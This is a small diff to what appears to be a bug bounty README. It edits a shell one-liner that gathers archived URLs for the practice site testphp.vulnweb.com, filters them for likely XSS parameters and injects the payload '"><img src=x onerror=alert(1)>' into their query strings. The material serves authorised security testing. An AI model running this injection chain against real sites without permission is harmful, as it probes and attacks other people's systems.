@@ -2,7 +2,7 @@
 One Liner for Bug Bounty Hunting
 
 ```bash
-echo "testphp.vulnweb.com" | waybackurls --fc 200 | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
+echo "testphp.vulnweb.com" | waybackurls | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
 ```
 
 ```bash
